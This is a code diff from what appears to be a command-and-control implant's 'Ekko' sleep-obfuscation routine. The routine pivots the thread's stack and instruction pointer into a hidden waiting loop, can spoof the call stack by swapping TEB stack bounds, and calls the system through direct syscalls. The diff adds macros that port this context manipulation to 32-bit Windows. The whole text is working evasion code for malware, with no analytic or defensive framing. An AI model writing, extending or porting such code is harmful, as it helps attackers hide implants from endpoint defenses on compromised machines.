@@ -111,6 +111,16 @@ static volatile EKKO_CONTEXT* g_EkkoCtx = NULL;
 /* Persistent direct-syscall functionTable for Ekko (reused across sleep cycles) */
 static functionTable* g_ekkofuncTable = NULL;
 
+#ifdef _WIN64
+#define CTX_RIP(ctx, f) ((ctx)->f.Rip)
+#define CTX_RSP(ctx, f) ((ctx)->f.Rsp)
+#define CTX_REG_CAST(x) ((DWORD64)(x))
+#else
+#define CTX_RIP(ctx, f) ((ctx)->f.Eip)
+#define CTX_RSP(ctx, f) ((ctx)->f.Esp)
+#define CTX_REG_CAST(x) ((DWORD)(x))
+#endif
+
 /* ==========================================================================
  * Forward declarations for RX stub functions (EKO_IMPL=2 only)
  * ========================================================================== */
@@ -354,8 +364,8 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
     if (ctx->wokeUp) {
         g_debugPrint("[+] Woke up! Resuming on original stack.");
         g_debugPrint("[+] Restored Rsp=0x%llX Rip=0x%llX",
-                     (UINT64)ctx->originalContext.Rsp,
-                     (UINT64)ctx->originalContext.Rip);
+                     (UINT64)CTX_RSP(ctx, originalContext),
+                     (UINT64)CTX_RIP(ctx, originalContext));
         ekkoNt->NtClose(ctx->doneEvent);
         if (ctx->helperStack) {
             ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx->helperStack);
@@ -376,10 +386,10 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
 #if EKKO_USE_RUNTIME_RX
     /* RIP points to WaitingLoop in our RX stub (not in .text) */
     SIZE_T waitingLoopOffset = (SIZE_T)&SleepObf_WaitingLoop - (SIZE_T)__text_ekko_start;
-    ctx->pivotContext.Rip = (DWORD64)((BYTE*)ctx->rxStubBase + waitingLoopOffset);
+    CTX_RIP(ctx, pivotContext) = CTX_REG_CAST((BYTE*)ctx->rxStubBase + waitingLoopOffset);
 #else
     /* RIP points directly to WaitingLoop in .obf section */
-    ctx->pivotContext.Rip = (DWORD64)&SleepObf_WaitingLoop;
+    CTX_RIP(ctx, pivotContext) = CTX_REG_CAST(&SleepObf_WaitingLoop);
 #endif
 
     if (config->options.sleep_stack_spoof) {
@@ -409,7 +419,7 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
                 g_debugPrint("[SleepObf_Ekko] Stack spoof: no resolved chain addresses, TEB swap only");
             }
 
-            ctx->pivotContext.Rsp = (DWORD64)(ctx->helperStack + ctx->helperStackSize - 0x200);
+            CTX_RSP(ctx, pivotContext) = CTX_REG_CAST(ctx->helperStack + ctx->helperStackSize - 0x200);
 
             PTEB teb = ekkoNt->parameters.TEB;
             ctx->savedStackBase = teb->NtTib.StackBase;
@@ -418,13 +428,13 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
     }
 
     g_debugPrint("[SleepObf_Ekko] [+] originalContext: Rsp=0x%llX Rip=0x%llX",
-                 (UINT64)ctx->originalContext.Rsp, (UINT64)ctx->originalContext.Rip);
+                 (UINT64)CTX_RSP(ctx, originalContext), (UINT64)CTX_RIP(ctx, originalContext));
 #if EKKO_USE_OBF_SECTION
     g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in .obf section)",
-                 (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);
+                 (UINT64)CTX_RSP(ctx, pivotContext), (UINT64)CTX_RIP(ctx, pivotContext));
 #else
     g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in RX stub)",
-                 (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);
+                 (UINT64)CTX_RSP(ctx, pivotContext), (UINT64)CTX_RIP(ctx, pivotContext));
 #endif
 
     /* 4. Pivot stack and enter waiting loop */
